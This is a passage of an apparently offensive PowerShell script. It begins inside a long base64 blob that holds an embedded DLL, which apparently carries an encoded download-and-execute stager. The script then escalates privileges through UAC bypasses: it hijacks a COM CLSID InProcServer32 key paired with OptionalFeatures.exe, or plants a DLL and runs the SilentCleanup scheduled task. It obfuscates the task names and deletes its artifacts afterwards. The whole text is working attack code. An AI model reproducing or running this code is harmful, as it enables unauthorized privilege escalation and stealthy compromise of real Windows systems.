UJRQUd3QVlRQnBBRzRBVkFCbEFIZ0FkQUFnQUQwQUlBQmJBRk1BZVFCekFIUUFaUUJ0QUM0QVZBQmxBSGdBZEFBdUFFVUFiZ0JqQUc4QVpBQnBBRzRBWndCZEFEb0FPZ0JCQUZNQVF3QkpBRWtBTGdCSEFHVUFkQUJUQUhRQWNnQnBBRzRBWndBb0FDZ0FKZ0FnQUNRQVJRQWdBQ1FBUXdCcEFIQUFhQUJsQUhJQUlBQWtBRXNBWlFCNUFDa0FLUUFLQUFrQWNnQmxBSFFBZFFCeUFHNEFJQUFpQUdnQWRBQjBBSEFBY3dBNkFDOEFMd0FpQUNBQUt3QWdBQ1FBVlFCU0FFd0FVQUJzQUdFQWFRQnVBRlFBWlFCNEFIUUFDZ0I5QUFvQUNnQWtBSEFBWVFCMEFHZ0FJQUE5QUNBQUlnQXZBR01BTHdCdEFHa0FJZ0FLQUNRQVZ3QmxBR0lBUXdCc0FHa0FaUUJ1QUhRQUlBQTlBQ0FBVGdCbEFIY0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVGdCbEFIUUFMZ0JYQUdVQVlnQkRBR3dBYVFCbEFHNEFkQUFLQUNRQVZ3QmxBR0lBUXdCc0FHa0FaUUJ1QUhRQUxnQklBR1VBWVFCa0FHVUFjZ0J6QUM0QVFRQmtBR1FBS0FBaUFGVUFjd0JsQUhJQUxRQkJBR2NBWlFCdUFIUUFJZ0FzQUNBQUlnQk5BRzhBZWdCcEFHd0FiQUJoQUM4QU5RQXVBREFBSUFBb0FGY0FhUUJ1QUdRQWJ3QjNBSE1BSUFCT0FGUUFJQUF4QURBQUxnQXdBRHNBSUFCWEFHa0FiZ0EyQURRQU93QWdBSGdBTmdBMEFDa0FJQUJCQUhBQWNBQnNBR1VBVndCbEFHSUFTd0JwQUhRQUx3QTFBRE1BTndBdUFETUFOZ0FvQUVzQVNBQlVBRTBBVEFBc0FDQUFiQUJwQUdzQVpRQWdBRWNBWlFCakFHc0Fid0FwQUNBQVF3Qm9BSElBYndCdEFHVUFMd0E1QURBQUxnQXdBQzRBTkFBMEFETUFNQUF1QURJQU1RQXlBQ0FBVXdCaEFHWUFZUUJ5QUdrQUx3QTFBRE1BTndBdUFETUFOZ0FpQUNrQUNnQWtBRU1BUXdCVkFISUFiQUFnQUQwQUlBQW9BR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"
    }
    $dll_bytes = [Convert]::FromBase64String($encoded_dll)
    
    If (([Environment]::OSVersion.Version.Major) -lt 10) { 
        
        $dll_path = $env:LOCALAPPDATA + "\Temp\setup.dll"
        [Io.File]::WriteAllBytes($dll_path, $dll_bytes)
        
        $inprocserver_path = "HKCU:\Software\Classes\CLSID\{08244EE6-92F0-47F2-9FC9-929BAA2E7235}\InProcServer32"
        New-Item $inprocserver_path -Force | New-ItemProperty -Name "(Default)" -Value $dll_path -PropertyType string -Force | Out-Null

        $exe_path = Join-Path -Path ([Environment]::GetFolderPath("System")) -ChildPath "OptionalFeatures.exe"
        $process = Start-Process -WindowStyle hidden -FilePath $exe_path -PassThru
        
        $clsid_path = "HKCU:\Software\Classes\CLSID\{08244EE6-92F0-47F2-9FC9-929BAA2E7235}"
        
        Start-Sleep 60
        
        Remove-Item $clsid_path -Recurse -Force
        Remove-Item $dll_path
        
    } Else {
   
        $dll_path = $env:LOCALAPPDATA + "\Microsoft\WindowsApps\api-ms-win-core-kernel32-legacy-l1.dll"

        While((Get-ScheduledTask -TaskName ("Sile" + "ntCleanup")).State -ne "Ready")
        {
            Start-Sleep 5
        }
        
        [Io.File]::WriteAllBytes($dll_path, $dll_bytes)

        schtasks.exe /Run /TN ("\Microsoft\Windows\DiskC" + "leanup\Silen" + "tCleanup") /I | Out-Null

        While((Get-ScheduledTask -TaskName ("Sile" + "ntCleanup")).State -ne "Ready")
        {
            Start-Sleep 5
        }
    
        Remove-Item $dll_path
        
    }
}